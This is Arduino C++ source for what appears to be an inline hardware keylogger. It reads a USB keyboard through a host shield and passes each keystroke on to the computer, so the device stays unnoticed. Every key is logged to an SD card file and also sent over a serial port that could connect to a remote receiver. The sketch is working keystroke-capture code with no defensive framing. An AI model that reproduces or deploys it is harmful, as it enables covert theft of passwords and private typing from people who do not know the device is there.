#include <Keyboard.h>
#include <hidboot.h>
#include <usbhub.h>
#include <SD.h>
#include <SPI.h>

#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)
#define SHIFT   (0x80)
#define ALTGR   (0x40)

extern const uint8_t _asciimap[] PROGMEM;

//modifiers
int leftctrl_status=0;
int leftshift_status=0;
int leftalt_status=0;
int leftgui_status=0;
int rightctrl_status=0;
int rightshift_status=0;
int rightalt_status=0;
int rightgui_status=0;
uint8_t modifiers=0;
uint8_t modifiersard=0;
int key_modifier;

File SDlog;

void SetModifiers(void) {
    modifiers=0;
    if (leftctrl_status) modifiers = (modifiers | MODIFIERKEY_LEFT_CTRL);
    if (leftshift_status) modifiers = (modifiers | MODIFIERKEY_LEFT_SHIFT);
    if (leftalt_status) modifiers = (modifiers | MODIFIERKEY_LEFT_ALT);
    if (leftgui_status) modifiers = (modifiers | MODIFIERKEY_LEFT_GUI);
    if (rightctrl_status) modifiers = (modifiers | MODIFIERKEY_RIGHT_CTRL);
    if (rightshift_status) modifiers = (modifiers | MODIFIERKEY_RIGHT_SHIFT);
    if (rightalt_status) modifiers = (modifiers |  MODIFIERKEY_RIGHT_ALT);
    if (rightgui_status) modifiers = (modifiers | MODIFIERKEY_RIGHT_GUI);   
};

void SetModifiersArd(void) {
    modifiersard=0;
    if (leftshift_status) modifiersard = (modifiersard | SHIFT);
    if (rightalt_status) modifiersard = (modifiersard |  ALTGR);   
};

class KbdRptParser : public KeyboardReportParser {
    void PrintKey(uint8_t mod, uint8_t key);

  protected:
    void OnControlKeysChanged(uint8_t before, uint8_t after);

    void OnKeyDown  (uint8_t mod, uint8_t key);
   void OnKeyUp  (uint8_t mod, uint8_t key);
    void OnKeyPressed(uint8_t key);
};

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
  Keyboard.rawrelease(key, 0);
  SetModifiersArd();
  key_modifier = key|modifiersard,HEX;
  SDlog = SD.open("log.txt", FILE_WRITE);

  for (int i = 0; i < 256; i++) {
    if(pgm_read_byte(_asciimap + i) == key_modifier){
      SDlog.write(i);
      SDlog.close();
      Serial1.write(i);
    }
  }
}

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) { 
  SetModifiers();
  Keyboard.rawpress(key, modifiers);
}

void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {
    
    MODIFIERKEYS beforeMod;
    *((uint8_t*)&beforeMod) = before;

    MODIFIERKEYS afterMod;
    *((uint8_t*)&afterMod) = after;

    if (beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl) {
        leftctrl_status=!leftctrl_status;
    }
    if (beforeMod.bmLeftShift != afterMod.bmLeftShift) {
        leftshift_status=!leftshift_status;
    }
    if (beforeMod.bmLeftAlt != afterMod.bmLeftAlt) {
        leftalt_status=!leftalt_status;
    }
    if(beforeMod.bmLeftGUI != afterMod.bmLeftGUI)  {
        if(afterMod.bmLeftGUI) Keyboard.press(KEY_LEFT_GUI);
        else Keyboard.release(KEY_LEFT_GUI);
    }
    if (beforeMod.bmRightCtrl != afterMod.bmRightCtrl) {
        rightctrl_status=!rightctrl_status;
    }
    if (beforeMod.bmRightShift != afterMod.bmRightShift) {
        rightshift_status=!rightshift_status;
    }
    if (beforeMod.bmRightAlt != afterMod.bmRightAlt) {
        rightalt_status=!rightalt_status;
    }
    if (beforeMod.bmRightGUI != afterMod.bmRightGUI) {
        rightgui_status=!rightgui_status;
    }  
}

USB     Usb;
USBHub     Hub(&Usb);
HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&Usb);

KbdRptParser Prs;

void setup() {
  Serial.begin(115200);
  Serial1.begin(115200);
  SD.begin(5);
  
  #if !defined(__MIPSEL__)
    while (!Serial1); // Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
  #endif

  if (Usb.Init() == -1)
    delay(200);
    HidKeyboard.SetReportParser(0, &Prs);
}

void loop() {
  Usb.Task();
}
